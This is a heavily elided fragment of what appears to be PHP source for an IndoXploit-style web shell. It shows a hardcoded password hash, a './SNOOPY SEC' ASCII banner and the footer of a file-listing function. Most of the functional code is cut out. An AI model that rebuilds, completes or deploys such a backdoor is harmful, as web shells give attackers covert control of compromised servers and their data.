...
$password = "f55fc9719a066603197dfe4a184d906b";
...
<header>
	<pre>
      ______  _   _  ___   ___  ______   __  ____  _____ ____ 
     / / ___|| \ | |/ _ \ / _ \|  _ \ \ / / / ___|| ____/ ___|
 / /\___ \|  \| | | | | | | | |_) \ V /  \___ \|  _|| | 
   / /  ___) | |\  | |_| | |_| |  __/ | |    ___) | |__| |___ 
(_)_/  |____/|_| \_|\___/ \___/|_|    |_|   |____/|_____\____|
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "./SN00PY SEC")."</a></center>";
}
